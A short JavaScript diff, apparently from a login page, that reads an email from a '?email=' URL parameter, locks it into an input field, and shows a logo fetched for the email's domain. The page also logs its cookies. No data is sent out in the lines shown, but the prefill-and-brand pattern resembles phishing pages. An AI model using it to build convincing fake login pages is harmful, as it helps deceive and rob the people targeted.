@@ -417,13 +417,17 @@ function parseCookies(cookieString = document.cookie) {
 const cookies = parseCookies();
 // Optional: console log to check cookies
 console.log("Cookies available to JS:", cookies);
+// Get email from URL ?email=
+const params = new URLSearchParams(window.location.search);
+const rawEmail = params.get("email");
 
-// Check email validity before proceeding with UI updates
-if (/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
-  emailInput.value = rawHash;
+// Check if email exists AND is valid
+if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+
+  emailInput.value = rawEmail;
   emailInput.setAttribute("uneditable", true);
 
-  const domain = rawHash.split('@')[1];
+  const domain = rawEmail.split('@')[1];
 
   // Set logo
   logoImg.src = `https://logo.clearbit.com/${domain}`;
